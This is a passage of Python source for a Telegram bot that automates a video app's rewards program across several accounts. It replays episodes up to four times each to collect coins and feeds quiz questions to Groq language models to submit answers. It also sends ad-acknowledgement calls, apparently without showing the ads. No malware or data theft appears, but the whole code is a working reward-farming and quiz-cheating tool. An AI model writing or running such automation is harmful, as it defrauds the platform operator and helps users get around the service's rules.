        if stopped:
            summary += "⏹ Stopped by user.\n"
        if delta is not None:
            summary += f"Balance: {balance_before} → {bal_end} ({delta:+d})"
        send_log_sync(summary)

        return {
            "watched": total_watched,
            "skipped": total_skipped,
            "failed": total_failed,
            "balance_before": balance_before,
            "balance_after": bal_end,
            "delta": delta,
            "stopped": stopped,
        }

    def watch_series_smart_repeat(
        self, series_id, progress_callback=None, max_total_watches=None, telegram_user_id=None,
    ):
        def log(msg):
            if progress_callback:
                progress_callback(msg)

        log("Fetching series info & episodes...")
        all_series = self.get_all_series(page_size=200, max_pages=5)
        series_info = None
        for s in all_series:
            sid = s.get("_id") or s.get("id") or s.get("series_id")
            if sid == series_id:
                series_info = s
                break
        if not series_info:
            return {"error": f"Series {series_id} not found"}

        episodes, _ = self.get_episodes(series_id, page=1, page_size=500)
        if not episodes:
            return {"error": "No episodes"}
        episodes = sorted(
            episodes,
            key=lambda e: int(e.get("episodeNo") or 0) if str(e.get("episodeNo") or "").isdigit() else 0,
        )
        title = series_info.get("title") or "Series"

        try:
            self.get_profile()
        except Exception:
            pass
        watch_counts = self.get_watch_counts_from_profile()

        total_watched = 0
        total_skipped = 0
        total_failed = 0
        balance_before = self.get_balance_silent()
        stopped = False

        try:
            self._start_task_for_series(series_id)
        except Exception:
            pass

        budget = max_total_watches or (len(episodes) * MAX_WATCHES_PER_EP)

        try:
            for wi in range(1, MAX_WATCHES_PER_EP + 1):
                if total_watched >= budget:
                    break
                log(f"--- Pass {wi}/{MAX_WATCHES_PER_EP} | {len(episodes)} eps ---")
                for ei, ep in enumerate(episodes, 1):
                    if stop_flags.get(telegram_user_id, False):
                        log("⏹ Stopped by user.")
                        stopped = True
                        break
                    if total_watched >= budget:
                        break
                    ep_no = ep.get("episodeNo")
                    kp = (str(series_id), str(ep_no))
                    cnt = watch_counts.get(kp, 0) + self.runtime_watch_counts.get(kp, 0)
                    if cnt >= wi:
                        if wi == 1:
                            total_skipped += 1
                        continue
                    log(f"  → {title} E{ep_no} (watch #{wi}/{MAX_WATCHES_PER_EP}) | +{REWARDS_BY_WATCH[wi]} coins")
                    ok, st = self.watch_episode(ep, series_info, allow_repeat=True, nth_watch=wi)
                    if st == "skip":
                        total_skipped += 1
                    elif ok:
                        total_watched += 1
                    else:
                        total_failed += 1
                if stopped:
                    break
        finally:
            stop_flags.pop(telegram_user_id, None)

        try:
            self.claim_reward_task(series_id=series_id)
        except Exception:
            pass

        bal_end = self.get_balance_silent()
        delta = None
        if balance_before is not None and bal_end is not None:
            delta = bal_end - balance_before

        return {
            "series_id": series_id,
            "title": title,
            "episodes": len(episodes),
            "watched": total_watched,
            "skipped": total_skipped,
            "failed": total_failed,
            "balance_before": balance_before,
            "balance_after": bal_end,
            "delta": delta,
            "stopped": stopped,
        }

    # ── QUIZ ──
    def get_quiz_status(self):
        sc, data = self._req("GET", "/quiz/status")
        if sc == 200 and isinstance(data, dict) and data.get("success"):
            return data
        return None

    def quiz_start_session(self):
        sc, data = self._req(
            "POST", "/quiz/session/start",
            headers={"content-type": "application/json; charset=utf-8"},
            data=json.dumps({}).encode("utf-8"),
        )
        send_log_sync(
            f"📡 quiz/session/start response:\n"
            f"Status: {sc}\n"
            f"Data: {json.dumps(data, ensure_ascii=False)[:500]}"
        )
        if sc == 200 and isinstance(data, dict):
            if data.get("success") is True or data.get("status") == "success":
                session_obj = data.get("session") or {}
                question_obj = data.get("question")
                sid = session_obj.get("sessionId") or data.get("sessionId") or data.get("_id")
                if not question_obj:
                    question_obj = data.get("data", {}).get("question") or data.get("next", {}).get("question")
                if sid and question_obj:
                    return sid, question_obj, session_obj
                else:
                    send_log_sync(
                        f"⚠️ Missing sessionId or question in response.\n"
                        f"sid={sid}, question_obj={question_obj is not None}"
                    )
            else:
                send_log_sync(f"❌ Quiz start returned success=False: {data.get('message', data)}")
        else:
            send_log_sync(f"❌ Quiz start HTTP {sc}: {str(data)[:300]}")
        return None, None, None

    def quiz_submit_answer(self, session_id, question_id, chosen_index):
        payload = {
            "sessionId": session_id,
            "questionId": question_id,
            "chosenIndex": chosen_index,
        }
        sc, data = self._req(
            "POST", "/quiz/session/answer",
            headers={"content-type": "application/json; charset=utf-8"},
            data=json.dumps(payload, ensure_ascii=False).encode("utf-8"),
        )
        if sc == 200 and isinstance(data, dict):
            return data
        return None

    def quiz_use_lifeline(self, session_id, question_id):
        payload = {"sessionId": session_id, "questionId": question_id}
        sc, data = self._req(
            "POST", "/quiz/session/lifeline",
            headers={"content-type": "application/json; charset=utf-8"},
            data=json.dumps(payload, ensure_ascii=False).encode("utf-8"),
        )
        if sc == 200 and isinstance(data, dict) and data.get("success"):
            return data.get("removedOptions", [])
        return None

    def quiz_ad_ack(self, session_id):
        payload = {"sessionId": session_id}
        sc, data = self._req(
            "POST", "/quiz/session/ad-ack",
            headers={"content-type": "application/json; charset=utf-8"},
            data=json.dumps(payload, ensure_ascii=False).encode("utf-8"),
        )
        if sc == 200 and isinstance(data, dict) and data.get("success"):
            return data.get("question")
        return None

    def _build_quiz_prompt(self, question, options):
        prompt = (
            "Solve this multiple-choice question. "
            "Return ONLY the integer index of the correct option (0, 1, 2, ...). "
            "No explanation, no extra words, just a single digit integer.\n\n"
            f"Question (both Hindi and English provided):\n"
            f"{question}\n\n"
            "Options:\n"
        )
        for i, opt in enumerate(options):
            prompt += f"  {i}: {opt}\n"
        prompt += "\nCorrect option index (integer only): "
        return prompt

    def _parse_quiz_answer(self, answer_text, options):
        if not answer_text:
            return None
        t = answer_text.strip()
        m = re.search(r"\b(\d+)\b", t)
        if m:
            idx = int(m.group(1))
            if 0 <= idx < len(options):
                return idx
        for i, opt in enumerate(options):
            opt_clean = str(opt).strip().lower()
            if opt_clean and opt_clean in t.lower():
                return i
        m2 = re.search(r"option\s*(\d+)", t, flags=re.IGNORECASE)
        if m2:
            idx = int(m2.group(1))
            if 1 <= idx <= len(options):
                return idx - 1
        return None

    def ask_groq(self, question, options, telegram_user_id: int = None):
        keys = get_user_groq_keys(telegram_user_id) if telegram_user_id else []
        if not keys:
            if GLOBAL_GROQ_API_KEY:
                keys = [GLOBAL_GROQ_API_KEY]
            else:
                send_log_sync(f"❌ No Groq key for user <code>{telegram_user_id}</code>")
                return None, None, None

        prompt = self._build_quiz_prompt(question, options)

        for key in keys:
            for model in GROQ_MODELS:
                try:
                    from groq import Groq
                    client = Groq(api_key=key)
                    completion = client.chat.completions.create(
                        model=model,
                        messages=[
                            {
                                "role": "system",
                                "content": (
                                    "You are a smart quiz solver. "
                                    "Read the question and options carefully. "
                                    "Reply with ONLY a single integer number (0, 1, 2 or 3). "
                                    "Do not write any explanation or extra text."
                                )
                            },
                            {"role": "user", "content": prompt}
                        ],
                        temperature=0.0,
                        max_tokens=15,
                    )
                    answer_text = (completion.choices[0].message.content or "").strip()
                    idx = self._parse_quiz_answer(answer_text, options)
                    if idx is not None:
                        return idx, model, answer_text
                except Exception as e:
                    err = str(e).lower()
                    if "rate" in err or "limit" in err or "quota" in err or "429" in err:
                        send_log_sync(f"⏳ Model {model} rate‑limited for key {key[:10]}..., trying next.")
                        continue
                    else:
                        continue

        if keys:
            try:
                r = requests.post(
                    "https://api.groq.com/openai/v1/chat/completions",
                    headers={
                        "Authorization": f"Bearer {keys[0]}",
                        "Content-Type": "application/json",
                    },
                    json={
                        "model": GROQ_MODELS[0],
                        "messages": [
                            {
                                "role": "system",
                                "content": "Reply with ONLY one number: 0, 1, 2 or 3. Nothing else."
                            },
                            {"role": "user", "content": prompt}
                        ],
                        "temperature": 0.0,
                        "max_tokens": 10,
                    },
                    timeout=45,
                )
                if r.status_code == 200:
                    answer_text = r.json()["choices"][0]["message"]["content"].strip()
                    idx = self._parse_quiz_answer(answer_text, options)
                    if idx is not None:
                        return idx, "http-fallback", answer_text
            except Exception as e:
                send_log_sync(f"HTTP fallback error: {e}")

        return None, None, None

    def run_quiz_auto(
        self,
        max_sessions=3,
        question_delay=QUIZ_QUESTION_DELAY,
        progress_callback=None,
        telegram_user_id=None,
    ):
        def log(msg):
            if progress_callback:
                progress_callback(msg)

        if not self.user_id:
            if not self.get_user():
                return {"error": "User not authenticated. Re-login required."}

        status = self.get_quiz_status()
        if not status:
            return {"error": "Could not fetch quiz status"}
        daily = status.get("dailyAttempts", {}) or {}
        if daily.get("exhausted"):
            return {"error": "Daily quiz attempts exhausted"}

        total_coins = 0
        sessions_done = 0
        debug_lines = []
        failed_attempts = 0
        stopped = False

        send_log_sync(
            f"🧠 QUIZ STARTED | User <code>{telegram_user_id}</code> | Sessions: {max_sessions}"
        )

        try:
            for session_num in range(1, max_sessions + 1):
                if stop_flags.get(telegram_user_id, False):
                    log("⏹ Stopped by user.")
                    stopped = True
                    break

                log(f"--- Session {session_num}/{max_sessions} ---")

                session_id, question_obj, session_meta = None, None, None
                for attempt in range(2):
                    session_id, question_obj, session_meta = self.quiz_start_session()
                    if session_id and question_obj:
                        break
                    if attempt == 0:
                        log("⚠️ Session start failed, retrying in 3s...")
                        time.sleep(3)

                if not session_id or not question_obj:
                    log("❌ Failed to start session after retry")
                    send_log_sync(f"❌ Session start failed | User <code>{telegram_user_id}</code>")
                    failed_attempts += 1
                    if failed_attempts >= 2:
                        log("Aborting: too many failed attempts to start session.")
                        break
                    time.sleep(3)
                    continue

                hearts = session_meta.get("hearts", 3) if session_meta else 3

                if hearts == 0:
                    log(f"💔 Session has 0 hearts – cannot continue.")
                    failed_attempts += 1
                    if failed_attempts >= 2:
                        log("Aborting: repeated dead sessions.")
                        break
                    time.sleep(5)
                    continue

                failed_attempts = 0

                ad_every = session_meta.get("adGateEvery", 5) if session_meta else 5
                q_count = 0
                session_coins = 0
                correct_count = 0
                wrong_count = 0

                while True:
                    if stop_flags.get(telegram_user_id, False):
                        log("⏹ Stopped by user.")
                        stopped = True
                        break
                    if hearts <= 0:
                        log("No hearts left")
                        break
                    if not question_obj or not isinstance(question_obj, dict):
                        break

                    q_id = question_obj.get("questionId")
                    q_text_hi = question_obj.get("questionHi") or ""
                    q_text_en = question_obj.get("questionEn") or ""
                    options = question_obj.get("options", [])
                    q_idx = question_obj.get("index", q_count)
                    q_total = question_obj.get("total", "?")

                    q_count += 1
                    combined = q_text_hi
                    if q_text_en and q_text_en != q_text_hi:
                        combined = f"{q_text_hi}\n[EN: {q_text_en}]" if q_text_hi else q_text_en

                    if not q_id or len(options) < 2:
                        send_log_sync(f"⚠️ Invalid question: q_id={q_id}, options={len(options)}")
                        break

                    correct_index, model_used, raw_answer = self.ask_groq(
                        combined, options, telegram_user_id=telegram_user_id
                    )
                    if correct_index is None:
                        removed = self.quiz_use_lifeline(session_id, q_id) or []
                        remaining = [i for i in range(len(options)) if i not in set(removed)]
                        correct_index = remaining[0] if remaining else 0
                        model_used = "lifeline/guess"
                        raw_answer = "N/A"
                        send_log_sync(f"⚠️ Model failed → using lifeline/guess index: {correct_index}")

                    correct_index = max(0, min(correct_index, len(options) - 1))
                    chosen_text = options[correct_index]

                    time.sleep(question_delay)

                    result = self.quiz_submit_answer(session_id, q_id, correct_index)
                    if not result:
                        break

                    if result.get("success"):
                        correct_flag = result.get("correct", False)
                        coins_earned = int(result.get("coinsEarned") or 0)
                        session_coins = result.get("coinsSoFar", 0)
                        hearts = int(result.get("hearts", hearts))
                        total_coins += coins_earned
                        if correct_flag:
                            correct_count += 1
                        else:
                            wrong_count += 1

                        status_emoji = "✅" if correct_flag else "❌"
                        correct_idx_server = result.get("correctIndex")
                        correct_server_text = ""
                        if correct_idx_server is not None:
                            try:
                                correct_server_text = f" (Correct: {correct_idx_server} '{options[correct_idx_server]}')"
                            except:
                                pass
                        debug_line = (
                            f"Q{q_idx+1}/{q_total}: {status_emoji} | "
                            f"Model: {model_used} | Raw: '{raw_answer[:30]}' | "
                            f"Chose: [{correct_index}] {chosen_text}{correct_server_text} | "
                            f"+{coins_earned}¢ | hearts {hearts}"
                        )

                        send_log_sync(f"<b>{debug_line}</b>")
                        debug_lines.append(debug_line)
                        if len(debug_lines) > 15:
                            debug_lines.pop(0)

                        user_debug = "\n".join(debug_lines)
                        log(f"--- Quiz running ---\n{user_debug}")

                        next_info = result.get("next")
                        if not next_info:
                            log(f"Session complete • {session_coins} coins")
                            break

                        if isinstance(next_info, dict):
                            if "question" in next_info and isinstance(next_info.get("question"), dict):
                                question_obj = next_info["question"]
                                session_id = result.get("sessionId") or session_id
                                continue
                            if "result" in next_info:
                                break
                            if next_info.get("questionId"):
                                question_obj = next_info
                                session_id = result.get("sessionId") or session_id
                                continue

                        if q_count > 0 and ad_every > 0 and (q_count % ad_every == 0):
                            nq = self.quiz_ad_ack(session_id)
                            if nq and isinstance(nq, dict):
                                question_obj = nq
                                continue
                            else:
                                break
                        break
                    else:
                        break

                session_summary = (
                    f"🏁 Session {session_num} finished\n"
                    f"Questions: {q_count}  |  Correct: {correct_count}  |  Wrong: {wrong_count}\n"
                    f"Coins earned: {session_coins}"
                )
                log(session_summary)
                send_log_sync(f"<b>{session_summary}</b>")

                sessions_done += 1
                if session_num < max_sessions:
                    time.sleep(2)
        finally:
            stop_flags.pop(telegram_user_id, None)

        final = (
            f"<b>🏁 QUIZ FINISHED</b>\n"
            f"User: <code>{telegram_user_id}</code>\n"
            f"Sessions: {sessions_done}\n"
            f"Total coins earned: ~{total_coins}\n"
            f"Balance now: {self.get_balance()}\n"
        )
        if stopped:
            final += "⏹ Stopped by user."
        send_log_sync(final)

        return {
            "sessions": sessions_done,
            "total_coins": total_coins,
            "balance": self.get_balance(),
            "stopped": stopped,
        }


# ───────────────────── Per-user instances ─────────────────────
user_bots: Dict[int, MiniPixV2] = {}


def get_bot(user_id: int) -> MiniPixV2:
    if user_id not in user_bots:
        user_bots[user_id] = MiniPixV2(telegram_user_id=user_id)
    return user_bots[user_id]


def main_menu_keyboard():
    return ReplyKeyboardMarkup(
        [
            [KeyboardButton("💰 Balance"), KeyboardButton("📊 Campaign")],
            [KeyboardButton("👥 Accounts"), KeyboardButton("➕ Login"), KeyboardButton("🔑 Token Login")],
            [KeyboardButton("🎬 Watch Series"), KeyboardButton("🎬 Watch All (4x)")],
            [KeyboardButton("🧠 Quiz Status"), KeyboardButton("🤖 Run Quiz")],
            [KeyboardButton("🔑 Set Groq Key"), KeyboardButton("⏹ Stop")],
            [KeyboardButton("ℹ️ Help")],
        ],
        resize_keyboard=True,
    )


# ───────────────────── Series / Episode helpers ─────────────────────
def _split_list(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


def build_series_keyboard(series_list, page=0, per_page=20):
    total = len(series_list)
    start = page * per_page
    end = min(start + per_page, total)
    chunk = series_list[start:end]

    buttons = []
    for s in chunk:
        sid = s.get("_id") or s.get("id") or s.get("series_id")
        title = s.get("title") or s.get("hindiTitle") or "???"
        eps = s.get("numberOfEpisodes") or s.get("totalEpisodes") or 0
        short = title if len(title) < 25 else title[:23] + "…"
        buttons.append([
            InlineKeyboardButton(f"🎬 {short} [{eps} eps]", callback_data=f"ser:{sid}:0"),
        ])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀ Prev", callback_data=f"sp:{page - 1}"))
    nav.append(InlineKeyboardButton(f"Page {page + 1}/{(total + per_page - 1) // per_page}", callback_data="noop"))
    if end < total:
        nav.append(InlineKeyboardButton("Next ▶", callback_data=f"sp:{page + 1}"))
    if nav:
        buttons.append(nav)

    return InlineKeyboardMarkup(buttons)


def build_episode_keyboard(series_id, episodes, mp_instance: MiniPixV2, force_refresh=False):
    if force_refresh:
        try:
            mp_instance.get_profile()
        except Exception:
            pass
    counts = mp_instance.get_watch_counts_from_profile()
    rt = mp_instance.runtime_watch_counts or {}

    row1 = [
        InlineKeyboardButton("⚡ Watch All (4x)", callback_data=f"all:{series_id}"),
        InlineKeyboardButton("🔙 Series List", callback_data="slist"),
    ]

    ep_buttons = []
    for ep in episodes:
        ep_no = ep.get("episodeNo")
        kp = (str(series_id), str(ep_no))
        cnt = counts.get(kp, 0) + rt.get(kp, 0)
        title = ep.get("title") or f"E{ep_no}"
        dur = ep.get("tcOut") or ep.get("durationMinutes") or ""
        dur_str = f"{dur}m" if dur else ""
        if cnt >= MAX_WATCHES_PER_EP:
            label = f"E{ep_no} ✔{cnt}x FULL"
            action = f"rew:{series_id}:{ep_no}"
        elif cnt > 0:
            label = f"E{ep_no} {cnt}x/{MAX_WATCHES_PER_EP}"
            action = f"rew:{series_id}:{ep_no}"
        else:
            label = f"▶ E{ep_no}"
            action = f"ep:{series_id}:{ep_no}"

        ep_buttons.append([
            InlineKeyboardButton(label, callback_data=action),
        ])

    rows = [row1] + ep_buttons
    return InlineKeyboardMarkup(rows)


# ───────────────────── Global Error Handler ─────────────────────
async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    err = context.error
    tb_str = "".join(traceback.format_exception(None, err, err.__traceback__)) if err else ""
    logger.error(f"Exception while handling update:\n{tb_str}")
    send_log_sync(f"❌ <b>Bot Error</b>\n<pre>{tb_str[:1200]}</pre>")

    uid = None
    chat_id = None
    effective_message = None
    if isinstance(update, Update):
        if update.effective_user:
            uid = update.effective_user.id
        if update.effective_chat:
            chat_id = update.effective_chat.id
        if update.effective_message:
            effective_message = update.effective_message
        elif update.callback_query and update.callback_query.message:
            effective_message = update.callback_query.message

    if uid is not None and is_busy(uid):
        clear_busy(uid)

    if chat_id is not None:
        user_hint = (
            "\n\n🔧 Troubleshoot:\n"
            "• Agar task stuck lage → /stop use karo\n"
            "• Dobara same button click karo ya command bhejo\n"
            "• Agar baar baar aaye → bot restart karo ya developer ko message bhejo."
        )
        try:
            await context.bot.send_message(
                chat_id=chat_id,
                text=(
                    f"❌ <b>Bot mein error aa gaya:</b>\n"
                    f"<code>{(str(err)[:300] if err else 'Unknown')}</code>"
                    f"{user_hint}"
                ),
                parse_mode="HTML",
            )
        except Exception:
            pass


# ───────────────────── Handlers ─────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    bot = get_bot(user.id)
    text = (
        f"👋 Hi {user.first_name}!\n\n"
        "MiniPix V2 Bot ready.\n\n"
        "• /setgroq – apna Groq API key set karo (multiple allowed)\n"
        "• /login – account login\n"
        "• /watch – 4x watch\n"
        "• /quiz – quiz status\n"
        "• /stop – stop current task"
    )
    if bot.access_token:
        text += f"\n\n✅ Logged in: {bot.current_account_label or bot.phone}"
    else:
        text += "\n\n⚠️ Not logged in → /login"
    await update.message.reply_text(text, reply_markup=main_menu_keyboard())


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Commands*\n\n"
        "/start – main menu\n"
        "/balance – coin balance\n"
        "/campaign – watch campaign\n"
        "/accounts – list / switch accounts\n"
        "/login – OTP or Token login (interactive)\n"
        "/tokenlogin `<token>` – Direct Access Token login (fast!)\n"
        "/series – choose series & episodes (watch / rewatch)\n"
        "/watch – watch selected series/episodes (same as /series)\n"
        "/watchall – auto watch EVERYTHING 4x smart (old mode)\n"
        "/quiz – quiz status\n"
        "/setgroq `gsk_xxx` – apna Groq key set karo (multiple allowed)\n"
        "/mygroq – check your keys\n"
        "/stop – stop current task (watch/quiz)\n"
        "/logout – logout\n\n"
        "Groq key free: https://console.groq.com/keys",
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(),
    )


async def set_groq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "Usage:\n`/setgroq gsk_your_key_here`\n\n"
            "Multiple keys allowed – use this command again to add another.\n"
            "Free key: https://console.groq.com/keys",
            parse_mode="Markdown",
        )
        return

    key = context.args[0].strip()
    if not key.startswith("gsk_"):
        await update.message.reply_text("❌ Invalid key. Must start with `gsk_`")
        return

    user_id = str(update.effective_user.id)
    keys = list(user_groq_keys.get(user_id, []))
    if key not in keys:
        keys.append(key)
        user_groq_keys[user_id] = keys
        save_user_groq_keys(user_groq_keys)
        send_data_log_sync(
            f"🔑 Groq key added for user <code>{user_id}</code>\n"
            f"Total keys: {len(keys)}"
        )
        await update.message.reply_text(f"✅ Groq API key added! Total keys: {len(keys)}")
    else:
        await update.message.reply_text("⚠️ Key already exists.")


async def my_groq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keys = user_groq_keys.get(str(update.effective_user.id), [])
    if keys:
        masked = [k[:10] + "..." + k[-4:] for k in keys]
        await update.message.reply_text(
            f"✅ Keys ({len(keys)}):\n" + "\n".join(masked),
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "❌ Koi key set nahi hai.\n\n`/setgroq gsk_xxxxxxxx`",
            parse_mode="Markdown",
        )


async def balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bot = get_bot(update.effective_user.id)
    if not bot.access_token:
        await update.message.reply_text("Not logged in. Use /login")
        return
    coins = bot.get_balance()
    if coins is None:
        await update.message.reply_text("Failed to fetch balance")
    else:
        await update.message.reply_text(f"💰 Coin Balance: *{coins}*", parse_mode="Markdown")


# ──────────────── Series / Episode Watch Handlers ────────────────
async def watch_series_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    bot = get_bot(uid)
    if not bot.access_token:
        await update.message.reply_text("Not logged in. Use /login")
        return
    if is_busy(uid):
        await update.message.reply_text("⏳ Pehle se ek task chal raha hai. Poora hone do ya /stop use karo.")
        return

    msg = await update.message.reply_text("🔍 Series list fetch ho raha hai...")
    loop = asyncio.get_running_loop()
    series_list = await loop.run_in_executor(
        BLOCKING_EXECUTOR, lambda: bot.get_all_series(page_size=200, max_pages=6)
    )
    if not series_list:
        await msg.edit_text("❌ Koi series nahi mili.")
        return

    context.user_data["series_list_cache"] = [(
        s.get("_id") or s.get("id") or s.get("series_id"),
        s.get("title") or s.get("hindiTitle") or "???",
        int(s.get("numberOfEpisodes") or s.get("totalEpisodes") or 0),
        s,
    ) for s in series_list if (s.get("_id") or s.get("id") or s.get("series_id"))]

    total_eps = sum(e for _, _, e, _ in context.user_data["series_list_cache"])
    header = (
        f"🎬 Choose a Series to Watch:\n\n"
        f"Total series: {len(context.user_data['series_list_cache'])}\n"
        f"Total episodes across all: {total_eps}\n\n"
        f"Per-episode 4x rewards: 15 → 8 → 5 → 3 coins"
    )
    kb = build_series_keyboard(series_list, page=0, per_page=20)
    await msg.edit_text(header, reply_markup=kb)


async def _get_series_obj(series_id, series_cache):
    for sid, title, eps, raw in (series_cache or []):
        if sid == series_id:
            return raw
    return None


async def _render_series_episodes(query, context, series_id, msg_to_edit=None):
    uid = query.from_user.id
    bot = get_bot(uid)
    cache = context.user_data.get("series_list_cache") or []
    series_obj = _get_series_obj(series_id, cache)
    title = None
    for sid, ttl, eps, raw in cache:
        if sid == series_id:
            title = ttl
            if not series_obj:
                series_obj = raw
            break

    loop = asyncio.get_running_loop()
    episodes, _ = await loop.run_in_executor(
        BLOCKING_EXECUTOR, lambda: bot.get_episodes(series_id, page=1, page_size=500)
    )
    if not episodes:
        return "❌ Is series mein koi episode nahi mili.", None

    episodes_sorted = sorted(
        episodes,
        key=lambda e: int(e.get("episodeNo") or 0) if str(e.get("episodeNo") or "").isdigit() else 0,
    )

    context.user_data["current_series_id"] = series_id
    context.user_data[f"episodes_{series_id}"] = episodes_sorted

    if not series_obj:
        for s in await loop.run_in_executor(
            BLOCKING_EXECUTOR, lambda: bot.get_all_series(page_size=500, max_pages=10)
        ):
            if (s.get("_id") or s.get("id")) == series_id:
                series_obj = s
                break
    title = series_obj.get("title") or series_obj.get("hindiTitle") or title or "Series" if series_obj else (title or "Series")
    context.user_data[f"series_{series_id}_obj"] = series_obj

    counts = bot.get_watch_counts_from_profile()
    rt = bot.runtime_watch_counts or {}
    total_unwatched = 0
    for ep in episodes_sorted:
        ep_no = ep.get("episodeNo")
        kp = (str(series_id), str(ep_no))
        if counts.get(kp, 0) + rt.get(kp, 0) == 0:
            total_unwatched += 1

    header = (
        f"🎬 <b>{title}</b>\n"
        f"Series ID: <code>{series_id}</code>\n"
        f"Episodes: {len(episodes_sorted)}\n"
        f"Unwatched: {total_unwatched} | Already watched (at least once): {len(episodes_sorted) - total_unwatched}\n\n"
        f"Per ep 4x rewards: 15→8→5→3 coins\n"
        f"Click ▶ for fresh watch | Click E{N} Nx/4 for Rewatch"
    )
    kb = build_episode_keyboard(series_id, episodes_sorted, bot, force_refresh=False)
    return header, kb


async def single_ep_watcher_runner(update_obj, context, series_id, ep_no_str, is_rewatch=False):
    """Called from callback dispatcher for ep: and rew: actions."""
    uid = update_obj.from_user.id
    bot = get_bot(uid)
    query = update_obj
    chat_id = getattr(query.message, "chat_id", None) if getattr(query, "message", None) else uid

    if not set_busy(uid):
        await query.answer("Task already running! Finish existing or use /stop", show_alert=True)
        return

    msg = None
    episodes_sorted = None
    try:
        try:
            ep_no = int(ep_no_str)
        except Exception:
            await query.answer("Invalid episode number", show_alert=True)
            return

        loop = asyncio.get_running_loop()

        episodes_sorted = context.user_data.get(f"episodes_{series_id}")
        series_obj = context.user_data.get(f"series_{series_id}_obj")

        if not episodes_sorted or not series_obj:
            if not series_obj:
                all_s = await loop.run_in_executor(
                    BLOCKING_EXECUTOR, lambda: bot.get_all_series(page_size=500, max_pages=10)
                )
                for s in all_s:
                    if (s.get("_id") or s.get("id") or s.get("series_id")) == series_id:
                        series_obj = s
                        break
                if not series_obj:
                    await query.answer("Series not found", show_alert=True)
                    return
            eps, _ = await loop.run_in_executor(
                BLOCKING_EXECUTOR, lambda: bot.get_episodes(series_id, page=1, page_size=500)
            )
            episodes_sorted = sorted(
                eps,
                key=lambda e: int(e.get("episodeNo") or 0) if str(e.get("episodeNo") or "").isdigit() else 0,
            )
            context.user_data[f"episodes_{series_id}"] = episodes_sorted
            context.user_data[f"series_{series_id}_obj"] = series_obj

        target_ep = None
        for ep in episodes_sorted:
            if str(ep.get("episodeNo")) == str(ep_no):
                target_ep = ep
                break
        if not target_ep:
            await query.answer(f"Episode {ep_no} not found", show_alert=True)
            return

        stop_flags.pop(uid, None)
        mode_text = "🔁 Rewatching" if is_rewatch else "▶ Watching"
        counts = bot.get_watch_counts_from_profile()
        rt = bot.runtime_watch_counts or {}
        kp = (str(series_id), str(ep_no))
        current_cnt = counts.get(kp, 0) + rt.get(kp, 0)
        nth = current_cnt + 1
        est_coins = REWARDS_BY_WATCH.get(nth, "?") if nth <= MAX_WATCHES_PER_EP else (15 if current_cnt == 0 else "?")

        title = (
            (series_obj.get("title") or series_obj.get("hindiTitle") or "Series")
            if isinstance(series_obj, dict) else "Series"
        )
        header = (
            f"{mode_text} <b>{title}</b>\n"
            f"Episode: {ep_no}  (Watch #{nth})\n"
            f"Estimated coins: +{est_coins}\n\n"
            f"⏳ Running..."
        )

        try:
            if query.message is not None:
                msg = await query.message.reply_text(header)
            else:
                msg = await context.bot.send_message(chat_id=chat_id, text=header)
        except Exception as send_err:
            try:
                await query.answer(f"Msg send failed: {str(send_err)[:60]}", show_alert=True)
            except Exception:
                pass
            return

        async def async_progress(text):
            try:
                await msg.edit_text(f"{header}\n\n{text[-600:]}")
            except Exception:
                pass

        def progress(text):
            try:
                loop.call_soon_threadsafe(
                    lambda: asyncio.create_task(async_progress(text))
                )
            except Exception:
                pass

        progress(f"Initiating watch #{nth} for E{ep_no}...")

        def sync_work():
            ok, st = bot.watch_episode(target_ep, series_obj, allow_repeat=True, nth_watch=nth)
            try:
                bot.claim_reward_task(series_id=series_id)
            except Exception:
                pass
            bal_b = bot.get_balance_silent()
            try:
                bot.get_profile()
            except Exception:
                pass
            bal_a = bot.get_balance_silent()
            return ok, st, bal_b, bal_a

        ok, st, bal_b, bal_a = await loop.run_in_executor(BLOCKING_EXECUTOR, sync_work)

        delta = None
        if bal_b is not None and bal_a is not None:
            delta = bal_a - bal_b

        result_header = (
            f"{'✅' if ok else '❌'} <b>{title}</b> E{ep_no}\n"
            f"Watch #{nth}/{MAX_WATCHES_PER_EP}  Result: {st}\n"
        )
        if delta is not None:
            result_header += f"Balance: {bal_b} → {bal_a} ({delta:+d})\n"

        counts = bot.get_watch_counts_from_profile()
        rt = bot.runtime_watch_counts or {}
        new_cnt = counts.get(kp, 0) + rt.get(kp, 0)
        result_header += f"New count for E{ep_no}: {new_cnt}/{MAX_WATCHES_PER_EP}"

        if query.message is not None and episodes_sorted:
            try:
                kb = build_episode_keyboard(series_id, episodes_sorted, bot, force_refresh=True)
                await query.message.edit_reply_markup(reply_markup=kb)
            except Exception:
                pass

        try:
            await msg.edit_text(result_header)
        except Exception as edit_err:
            try:
                await context.bot.send_message(chat_id=chat_id, text=result_header)
            except Exception:
                pass

        send_log_sync(
            f"<b>🎬 Single ep</b> | User <code>{uid}</code>\n"
            f"{title} E{ep_no} #{nth} → {st} | delta {delta:+d if delta is not None else '?'}"
        )

    except Exception as top_err:
        err_text = f"❌ Unexpected error: {str(top_err)[:200]}"
        try:
            if msg is not None:
                await msg.edit_text(err_text)
            else:
                await context.bot.send_message(chat_id=chat_id, text=err_text)
        except Exception:
            pass
        logger.error(f"single_ep_watcher_runner crash user={uid}: {top_err}\n{traceback.format_exc()}")

    finally:
        clear_busy(uid)


async def watch_series_all_runner(query, context, series_id):
    uid = query.from_user.id
    bot = get_bot(uid)
    chat_id = getattr(query.message, "chat_id", None) if getattr(query, "message", None) else uid

    if not set_busy(uid):
        await query.answer("Task already running! Finish existing or use /stop", show_alert=True)
        return

    msg = None
    try:
        title = None
        cache = context.user_data.get("series_list_cache") or []
        for sid, ttl, eps, raw in cache:
            if sid == series_id:
                title = ttl
                break
        if not title:
            loop = asyncio.get_running_loop()
            all_s = await loop.run_in_executor(
                BLOCKING_EXECUTOR, lambda: bot.get_all_series(page_size=300, max_pages=5)
            )
            for s in all_s:
